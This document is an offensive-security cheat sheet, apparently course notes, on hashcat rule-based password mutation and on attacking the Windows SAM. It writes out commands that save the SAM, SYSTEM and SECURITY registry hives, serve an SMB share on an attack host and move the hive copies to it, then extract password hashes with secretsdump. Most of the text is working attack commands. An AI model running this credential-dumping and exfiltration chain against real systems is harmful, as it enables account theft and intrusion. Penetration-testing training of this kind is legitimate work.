#  Password Mutations

### Hashcat Rule File

```
cat password.list
password

Function Description
: 	Do nothing.
l 	Lowercase all letters.
u 	Uppercase all letters.
c 	Capitalize the first letter and lowercase others.
sXY 	Replace all instances of X with Y.
$! 	Add the exclamation character at the end.

cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

### Generating Rule-based Wordlist
```
hashcat --force $input -r custom.rule --stdout | sort -u > $output
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list # example

cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

### Hashcat Existing Rules
```
ls /usr/share/hashcat/rules/
```
### [Default Credentials CheatSheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
### Attacking SAM

**hklm\sam**	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
**hklm\system** 	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
**hklm\security** 	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

### Creating a Share with smbserver.py

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData $some_folder
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData $HOME/ # Example
```

Once we have the share running on our attack host, we can use the move command on the Windows target to move the hive copies to the share.
```
move sam.save \\$lhost\CompData
move security.save \\$lhost\CompData
move system.save \\$lhost\CompData
# lhost is the smbserver we created
```

### Locating secretsdump.py

```
locate secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam $HOME/sam.save -security $HOME/security.save -system $HOME/system.save LOCAL
```


